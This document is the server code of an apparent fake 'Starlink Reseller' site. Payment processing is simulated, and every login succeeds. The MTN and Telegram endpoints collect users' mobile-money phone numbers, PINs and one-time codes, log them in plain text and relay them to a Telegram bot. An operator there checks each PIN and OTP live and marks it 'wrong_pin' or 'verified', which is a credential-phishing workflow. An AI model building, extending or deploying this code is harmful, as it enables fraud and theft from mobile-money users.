const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus, approvals } = require('./telegram-bot');
const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');

const app = express();
const PORT = process.env.PORT || 3000;

// Validate critical secrets on startup
const requiredSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
const missingSecrets = requiredSecrets.filter(key => !process.env[key] || process.env[key].includes('your-') || process.env[key].includes('change-me') || process.env[key].includes('placeholder'));
if (missingSecrets.length > 0) {
    console.error('Missing or invalid environment variables:', missingSecrets.join(', '));
    console.error('Please set these in your .env file.');
}

// Security middleware
app.use(securityHeaders);
app.use(corsMiddleware);
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));

// Session-based auth endpoint
app.post('/api/auth/session', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const token = createSession();
    res.json({ success: true, token, expiresIn: 3600000 });
});

// Explicit HTML routes — must come before static middleware
app.get('/starlink/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/status.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/starlink/plans.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/orders.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../orders.html'));
});

app.get('/starlink/settings.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../settings.html'));
});

app.get('/starlink/register.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../register.html'));
});

app.get('/starlink/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../user-login.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

// Root-level resources for payment gateway pages (must precede root static mount)
app.get('/manifest.json', (req, res) => {
    res.sendFile(path.join(__dirname, 'manifest.json'));
});

// Serve static assets
app.use('/starlink', express.static(path.join(__dirname, '../')));
app.use(express.static(path.join(__dirname, '../')));

// API Routes
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Starlink Reseller API is running' });
});

// Get all packages
    app.get('/api/packages', (req, res) => {
        const packages = [
            // Daily Limited
            { id: 'daily-1gb', name: '1 GB / 24h', data: '1 GB', duration: '24 hours', price: 150, originalPrice: 300, type: 'daily', limit: 'limited', currency: 'KES', features: ['1 GB data', '24h validity', 'Instant activation'] },
            { id: 'daily-3gb', name: '3 GB / 24h', data: '3 GB', duration: '24 hours', price: 350, originalPrice: 500, type: 'daily', limit: 'limited', currency: 'KES', features: ['3 GB data', '24h validity', 'Instant activation'] },
            { id: 'daily-7gb', name: '7 GB / 24h', data: '7 GB', duration: '24 hours', price: 600, originalPrice: 1000, type: 'daily', limit: 'limited', currency: 'KES', features: ['7 GB data', '24h validity', 'Instant activation'] },
            { id: 'daily-15gb', name: '15 GB / 24h', data: '15 GB', duration: '24 hours', price: 1000, originalPrice: 1500, type: 'daily', limit: 'limited', currency: 'KES', features: ['15 GB data', '24h validity', 'Instant activation'] },
            // Weekly Extended
            { id: 'daily-30gb', name: '30 GB / 7 days', data: '30 GB', duration: '7 days', price: 1500, originalPrice: 2200, type: 'weekly', limit: 'limited', currency: 'KES', features: ['30 GB data', '7 days validity', 'HD streaming'] },
            { id: 'daily-50gb', name: '50 GB / 15 days', data: '50 GB', duration: '15 days', price: 2200, originalPrice: 3200, type: 'weekly', limit: 'limited', currency: 'KES', features: ['50 GB data', '15 days validity', 'HD streaming', 'Priority support'] },
            // Unlimited
            { id: 'daily-unlimited', name: 'Unlimited / 3 days', data: 'Unlimited', duration: '3 days', price: 1200, originalPrice: 1800, type: 'daily', limit: 'unlimited', currency: 'KES', features: ['Unlimited data', '3 days validity', 'Instant activation'] },
            { id: 'weekly-unlimited', name: 'Unlimited / 7 days', data: 'Unlimited', duration: '7 days', price: 2500, originalPrice: 3500, type: 'weekly', limit: 'unlimited', currency: 'KES', features: ['Unlimited data', '7 days validity', 'HD streaming'] },
            { id: 'monthly-unlimited', name: 'Unlimited / 1 month', data: 'Unlimited', duration: '1 month', price: 6000, originalPrice: 9000, type: 'monthly', limit: 'unlimited', currency: 'KES', features: ['Unlimited data', '30 days validity', '4K streaming', 'Priority support', 'Static IP'] },
            // Monthly Limited
            { id: 'monthly-10gb', name: '10 GB / 1 month', data: '10 GB', duration: '1 month', price: 1200, originalPrice: 1800, type: 'monthly', limit: 'limited', currency: 'KES', features: ['10 GB data', '30 days validity', 'HD streaming'] },
            { id: 'monthly-50gb', name: '50 GB / 1 month', data: '50 GB', duration: '1 month', price: 3000, originalPrice: 4500, type: 'monthly', limit: 'limited', currency: 'KES', features: ['50 GB data', '30 days validity', '4K streaming', 'Priority support'] },
            { id: 'monthly-100gb', name: '100 GB / 1 month', data: '100 GB', duration: '1 month', price: 4800, originalPrice: 7000, type: 'monthly', limit: 'limited', currency: 'KES', features: ['100 GB data', '30 days validity', '4K streaming', 'Priority support'] }
        ];
        res.json(packages);
    });

// Process payment
app.post('/api/payment', (req, res) => {
    const { packageId, method, phone, amount } = req.body;
    
    // Validate
    if (!packageId || !method || !phone || !amount) {
        return res.status(400).json({ 
            success: false, 
            message: 'Missing required fields' 
        });
    }

    // Simulate payment processing
    const orderId = Date.now().toString();
    const status = 'pending';

    res.json({
        success: true,
        message: 'Payment processed successfully',
        orderId: orderId,
        status: status,
        packageId: packageId,
        method: method,
        phone: phone,
        amount: amount
    });
});

// Get orders by phone
app.get('/api/orders/:phone', (req, res) => {
    const phone = req.params.phone;
    // In a real app, fetch from database
    // For demo, return sample orders
    const orders = [
        {
            id: '1',
            package: 'Basic Package',
            amount: 3000,
            method: 'airtel',
            phone: phone,
            date: new Date().toISOString(),
            status: 'active'
        }
    ];
    res.json(orders);
});

// Webhook for Airtel Money
app.post('/api/webhook/airtel', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Airtel Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// Webhook for Orange Money
app.post('/api/webhook/orange', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Orange Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// ── Telegram notification endpoint ─────────────────────────────
app.post('/api/telegram/notify', validateApiSecret, (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.json({ success: false, message: 'Message required' });
    }
    const sent = require('./telegram-bot').sendNotification(message);
    res.json({ success: sent, message: sent ? 'Notification sent' : 'Bot not enabled' });
});

// ── MTN Mobile Money endpoints ───────────────────────────────────
app.post('/api/mtn/submit', (req, res) => {
    const { phone, pin, country, starlinkPackage } = req.body;
    console.log('MTN Submit:', { phone, pin, country, starlinkPackage });
    
    const requestId = 'REQ-' + Date.now().toString(36).toUpperCase();
    setMtnState(requestId, 'pending', { phone, pin, country, package: starlinkPackage });
    
    createApprovalRequest({
        userPhone: phone,
        userPin: pin,
        package: starlinkPackage || 'N/A',
        amount: 'N/A',
        method: 'mtn',
        requestId,
        onApproved: (id) => setMtnState(id, 'phone_pin_verified'),
        onRejected: (id) => setMtnState(id, 'rejected'),
        onWrongPin: (id) => setMtnState(id, 'wrong_pin'),
        onWrongOtp: (id) => setMtnState(id, 'wrong_otp'),
        onVerified: (id) => setMtnState(id, 'completed'),
        onInvalid: (id) => setMtnState(id, 'invalid'),
        onTimeout: (id) => setMtnState(id, 'timeout')
    });
    
    res.json({ success: true, message: 'MTN payment initiated', requestId });
});

app.post('/api/mtn/momo-message', (req, res) => {
    const { message, phone, country, attempt } = req.body;
    console.log('MTN MoMo Message:', { message, phone, country, attempt });
    res.json({ success: true });
});

app.post('/api/mtn/verify-otp', (req, res) => {
    const { phone, otp, country } = req.body;
    console.log('MTN Verify OTP:', { phone, otp, country });
    res.json({ success: true, message: 'OTP verified successfully' });
});

app.post('/api/mtn/resend-otp', (req, res) => {
    const { phone, country } = req.body;
    console.log('MTN Resend OTP:', { phone, country });
    res.json({ success: true, message: 'OTP resent successfully' });
});

app.post('/api/mtn/proceed-verified', (req, res) => {
    res.json({ success: true, message: 'Proceeding with verified account' });
});

app.get('/api/support-whatsapp', (req, res) => {
    res.json({ number: '237XXXXXXXX' });
});

// Fix /api/check-status to support mtn_verified
let mtnVerifiedStatus = false;
app.get('/api/check-status', (req, res) => {
    res.json({ status: mtnVerifiedStatus ? 'mtn_verified' : 'pending' });
});

app.post('/api/admin/mtn-verify', validateApiSecret, (req, res) => {
    mtnVerifiedStatus = true;
    res.json({ success: true, message: 'MTN account marked as verified' });
});

app.post('/api/admin/mtn-unverify', validateApiSecret, (req, res) => {
    mtnVerifiedStatus = false;
    res.json({ success: true, message: 'MTN account marked as unverified' });
});

// ── Auth stub endpoints (for register/login pages) ──────────────
app.post('/api/starlink/register', (req, res) => {
    const { phone, password, fullName } = req.body;
    console.log('Register attempt:', { phone, fullName });
    res.json({ success: true, message: 'Registration successful', phone, name: fullName });
});

app.post('/api/starlink/login', (req, res) => {
    const { phone, password } = req.body;
    console.log('Login attempt:', { phone });
    res.json({ success: true, message: 'Login successful', phone, name: 'User' });
});

// ── Agent payment API routes ───────────────────────────────────
app.get('/api/agent-config', (req, res) => {
        const country = req.query.country;
        const provider = req.query.provider;
        const agents = {
            'KE_airtel': { found: true, agent_number: '+254712345678', agent_name: 'Airtel Kenya Agent', instructions: 'Pay via Airtel Money to this number.' },
            'KE_safaricom': { found: true, agent_number: '+254712345678', agent_name: 'Safaricom M-Pesa Agent', instructions: 'Pay via M-Pesa to this number. Enter your M-Pesa PIN and confirm.' },
        };
        const key = country + '_' + provider;
        if (agents[key]) {
            res.json(agents[key]);
        } else {
            res.json({ found: false });
        }
    });

app.post('/api/agent-payment', (req, res) => {
    const { country, provider, location, phone, package: pkg, amount, confirmation_text } = req.body;
    console.log('Agent Payment Request:', { country, provider, location, phone, package: pkg, amount });
    setTimeout(() => {
        res.json({ success: true, orderId: 'AGT-' + Date.now() });
    }, 500);
});

// ── MTN State Machine ──────────────────────────────────────────
const mtnStateStore = new Map();

function setMtnState(requestId, state, data = {}) {
    mtnStateStore.set(requestId, {
        status: state,
        updatedAt: Date.now(),
        ...data
    });
}

function getMtnState(requestId) {
    const state = mtnStateStore.get(requestId);
    if (!state) return { status: 'not_found' };
    if (state.status === 'completed' && Date.now() - state.updatedAt > 30 * 60 * 1000) {
        mtnStateStore.delete(requestId);
        return { status: 'expired' };
    }
    return state;
}

app.get('/api/mtn/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const state = getMtnState(requestId);
    res.json(state);
});

app.post('/api/mtn/update-status', (req, res) => {
    const { requestId, status, phone, pin, otp, package: pkg, amount } = req.body;
    if (!requestId || !status) {
        return res.status(400).json({ success: false, message: 'requestId and status required' });
    }
    setMtnState(requestId, status, { phone, pin, otp, package: pkg, amount });
    res.json({ success: true, status });
});

// ── Telegram Bot API Routes ───────────────────────────────────

// Create a new payment approval request
app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), (req, res) => {
    const { userPhone, userPin, package: pkg, amount, method } = req.body;
    const clientIp = req.ip || 'unknown';
    
    // Validate inputs
    if (!validator.phone(userPhone)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_phone' });
        return res.status(400).json({ success: false, message: 'Invalid phone number format' });
    }
    if (!validator.pin(userPin)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_pin' });
        return res.status(400).json({ success: false, message: 'Invalid PIN format (4-6 digits required)' });
    }
    if (!validator.package(pkg)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_package' });
        return res.status(400).json({ success: false, message: 'Invalid package' });
    }
    if (method && !validator.method(method)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_method' });
        return res.status(400).json({ success: false, message: 'Invalid payment method' });
    }

    const requestId = createApprovalRequest({
        userPhone: validator.sanitize(userPhone),
        userPin: validator.sanitize(userPin),
        package: validator.sanitize(pkg),
        amount: amount ? validator.sanitize(amount) : 'N/A',
        method: method ? validator.sanitize(method) : 'N/A',
        onApproved: (id) => {
            console.log(`Approval request ${id} approved by admin`);
            auditLog.write('TELEGRAM_APPROVED', { requestId: id });
        },
        onRejected: (id) => {
            console.log(`Approval request ${id} rejected by admin`);
            auditLog.write('TELEGRAM_REJECTED', { requestId: id });
        },
        onInvalid: (id) => {
            console.log(`Approval request ${id} marked as invalid`);
            auditLog.write('TELEGRAM_INVALID', { requestId: id });
        },
        onVerified: (id) => {
            console.log(`OTP verification successful for request ${id}`);
            auditLog.write('TELEGRAM_VERIFIED', { requestId: id });
        },
        onWrongPin: (id) => {
            console.log(`Wrong PIN entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_PIN', { requestId: id });
        },
        onWrongOtp: (id) => {
            console.log(`Wrong OTP entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_OTP', { requestId: id });
        },
        onTimeout: (id) => {
            console.log(`OTP verification timeout for request ${id}`);
            auditLog.write('TELEGRAM_TIMEOUT', { requestId: id });
        }
    });

    auditLog.logTelegramRequest(clientIp, userPhone, pkg, method, requestId);
    res.json({ success: true, requestId, message: 'Approval request sent to admin' });
});

// Submit OTP for verification
app.post('/api/telegram/submit-otp', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, otp } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!validator.otp(otp)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_otp' });
        return res.status(400).json({ success: false, message: 'Invalid OTP format (4-8 digits required)' });
    }

    const result = submitOtp(requestId, validator.sanitize(otp));
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

// Public OTP submit for MTN frontend (no API secret required)
app.post('/api/mtn/submit-otp', (req, res) => {
    const { requestId, otp } = req.body;
    if (!requestId || !otp) {
        return res.status(400).json({ success: false, message: 'requestId and otp required' });
    }
    
    // Sync approvals status from mtnStateStore (source of truth)
    const mtnState = getMtnState(requestId);
    if (mtnState && mtnState.status) {
        const approvalRequest = approvals.get(requestId);
        if (approvalRequest && approvalRequest.status !== mtnState.status) {
            approvalRequest.status = mtnState.status;
        }
    }
    
    const result = submitOtp(requestId, otp);
    if (result.success) {
        setMtnState(requestId, 'otp_pending');
    }
    res.json(result);
});

// Submit verification link for Orange Money
app.post('/api/telegram/submit-link', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, link } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!link || typeof link !== 'string' || link.length < 5) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_link' });
        return res.status(400).json({ success: false, message: 'Invalid link format' });
    }

    const result = submitLink(requestId, (link || '').trim());
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

app.get('/api/telegram/status/:requestId', validateApiSecret, (req, res) => {
    const { requestId } = req.params;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        return res.status(400).json({ status: 'invalid_request_id' });
    }
    
    const status = getApprovalStatus(requestId);
    auditLog.logTelegramStatus(clientIp, requestId, status.status);
    res.json(status);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Starlink Reseller Server running on http://localhost:${PORT}`);
    console.log(`📡 API available at http://localhost:${PORT}/api`);
});